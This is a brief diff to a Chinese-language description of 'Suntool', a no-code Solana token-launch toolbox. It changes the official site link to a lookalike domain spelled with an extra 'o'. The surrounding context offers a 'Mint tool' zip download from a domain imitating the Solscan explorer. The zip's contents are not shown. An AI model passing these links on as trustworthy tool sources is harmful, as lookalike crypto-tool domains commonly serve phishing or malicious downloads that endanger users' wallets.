@@ -6,7 +6,7 @@ Suntool提供更易用、无需编程的全可视化工具箱，为Solana用户�
 
 一站式管理Solana代币上市流程 
 
-工具官网：https://www.suntool.vip/
+工具官网：https://www.suntoool.vip/
 
 Mint工具下载：https://www.solscan.men/solanamint.zip
 
